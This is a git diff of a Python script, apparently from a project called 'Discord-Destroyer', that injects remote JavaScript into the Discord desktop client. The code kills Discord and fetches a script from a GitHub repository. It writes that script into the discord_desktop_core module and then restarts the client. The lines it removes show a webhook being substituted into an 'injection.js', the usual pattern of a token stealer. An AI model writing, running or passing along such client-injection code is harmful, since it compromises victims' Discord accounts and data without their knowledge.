@@ -1,10 +1,10 @@
-import ntpath, os, re, time, subprocess, httpx
+import ntpath, os, re, time, subprocess, requests
 from sys import argv
 
 
 class Start:
     def __init__(self):
-        self.Webhook = "¤¤¤¤discord£££destroyer3738@darknosy30"
+        Install()
         self.local = os.getenv("localappdata")
         self.startup_loc = ntpath.join(
             os.getenv("appdata"),
@@ -15,12 +15,11 @@ class Start:
             "Startup",
         )
         self.discord = self.local + "\\Discord"
+        Close()
         for d in os.listdir(ntpath.abspath(self.discord)):
             if re.match(r"app-(\d*\.\d*)*", d):
                 self.app = ntpath.abspath(ntpath.join(self.discord, d))
                 self.modules = ntpath.join(self.app, "modules")
-                if not ntpath.exists(self.modules):
-                    httpx.post(self.Webhook, json="")
                 for dir in os.listdir(self.modules):
                     if re.match(r"discord_desktop_core-\d+", dir):
                         self.inj_path = (
@@ -34,10 +33,8 @@ class Start:
                                     )
                                 except PermissionError:
                                     pass
-                            f = httpx.get(
-                                "https://github.com/DARKNOSY/Discord-Destroyer/raw/main/injection.js"
-                            ).text.replace(
-                                "webhook: '%WEBHOOK%'", f"webhook: '{self.Webhook}'"
+                            f = requests.get(
+                                "https://raw.githubusercontent.com/DARKNOSY/Discord-Destroyer/main/Discord-Destroyer/src/index.js"
                             )
                             try:
                                 with open(
@@ -46,6 +43,31 @@ class Start:
                                     indexFile.write(f)
                             except PermissionError:
                                 pass
+                            self.start_discord(dir)
+
+
+    def start_discord(self, dir: str) -> None:
+        local_app_data = os.getenv("localappdata")
+        target_folder = "Discord" 
+        folder_path = os.path.join(local_app_data, target_folder)
+        os.chdir(folder_path)
+        update = dir + '\\Update.exe'
+        executable = dir.split('\\')[-1] + '.exe'
+
+        for file in os.listdir(dir):
+            if re.search(r'app-+?', file):
+                app = dir + '\\' + file
+                if os.path.exists(app + '\\' + 'modules'):
+                    for file in os.listdir(app):
+                        if file == executable:
+                            executable = app + '\\' + executable
+                            subprocess.call([update, '--processStart', executable],
+                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+def Install():
+    os.system("py -m pip install --upgrade requests")
+
+
 
 def Close():
     for proc in os.popen('tasklist').readlines():
@@ -53,8 +75,7 @@ def Close():
             pid = int(proc.split()[1])
             subprocess.run(['taskkill', '/F', '/PID', str(pid)])
             break
-    time.sleep(3)
-    # no restart, pr if you want one so bad
+        time.sleep(3)
+
 
 Start()
-Close()
